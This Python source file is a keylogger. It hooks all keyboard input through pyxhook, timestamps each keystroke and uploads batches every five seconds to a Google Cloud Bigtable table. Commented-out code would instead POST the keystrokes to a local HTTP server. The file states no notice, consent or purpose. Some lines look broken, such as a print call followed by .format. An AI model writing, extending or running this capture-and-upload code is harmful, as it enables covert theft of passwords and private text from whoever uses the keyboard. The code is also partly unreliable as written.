import requests

import sys
import os

sys.path.append(os.path.abspath("../pyxhook-master/")) #To allow for the pyxhook library to work

import pyxhook
import time
import parsingTool
import PackageData
import CharacterData
import json

from google.cloud import bigtable
import BtTableInfo as bti

running = False
cache = []
startTime = 0
endTime = 0
btinf1 = bti.BtTableInfo('','')

def initialiseBigtable(project_id, instance_id, table_id):
    print('Connecting to the {}.'.format(project_id))
    client = bigtable.Client(project=project_id, admin = True)

    print('Creating the {} instance.'.format(instance_id))
    instance = client.instance(instance_id)

    print('Creating the {} table.'.format(table_id))
    table = instance.table(table_id)
    table.create()
    column_family_id = 'cf1'
    cf1 = table.column_family(column_family_id)
    cf1.create()

    return bti.BtTableInfo(table, column_family_id)

def writeToBigtable(tableInfo, data):
    print("Writing data to table {}...").format(tableInfo.table)
    column_character = 'character'.encode('utf-8')
    column_time = 'time'.encode('utf-8')
    dataList = data.values
    for i in range(0,len(dataList)):
        row_key = 'Time:{}'.format(dataList[i][1])
        row = tableInfo.table.row(row_key)
        row.set_cell(
            tableInfo.column_family_id,
            column_character,
            dataList[i][0],
        )
        row.commit()


def sendData(cache):
    stringData = PackageData.PackageData(cache, startTime, endTime)
    writeToBigtable(btinf1, stringData)

    # Sending Data via JSON below:
        #stringData = PackageData.PackageData(cache, startTime, endTime).packageData_JSON()
        #headers = {'Content-type': 'application/json', 'Accept': 'text/plain'}
        #r = requests.post("http://127.0.0.1:8080/", data=json.dumps(stringData), headers=headers)

def cacheData(dataChars, time):
    #This should create a JSON object as a cache... TODO
    #Only relevent data should be cached and stored. Need a filter... TODO
    #Cache data for certain period.
    global cache
    cache.append(CharacterData.CharacterData(dataChars, time).getObject())

def kbevent (event):
    #print event
    #print event
    # Cache the data.
    cacheData(event.Key, time.time())
    #Send data to server after given period.
    #print cache

    global startTime
    global endTime

    #print startTime
    #print endTime

    #Kill logging if given code is hit.
    if event.Ascii == 65:
        global running
        running = False

def runHook():
    hm = pyxhook.HookManager()
    hm.KeyDown = kbevent
    hm.HookKeyboard()
    hm.start()

    global running
    running = True

    global endTime
    global startTime
    startTime = time.time()

    while running:
        if(time.time() > endTime):
            sendData(cache)
            cache[:] = [] #clear cache
            startTime = time.time() #reset timer
            endTime = startTime + 5
        time.sleep(0.1)

    hm.cancel()

def main():
    global btinf1
    btinf1 = initialiseBigtable('flaskbackend', 'flaskstore', 'TEST')

    runHook()

    #print('Deleting the {} table.'.format(btinf1.table))
    #btinf1.table.delete()

if __name__ == '__main__':
    main()
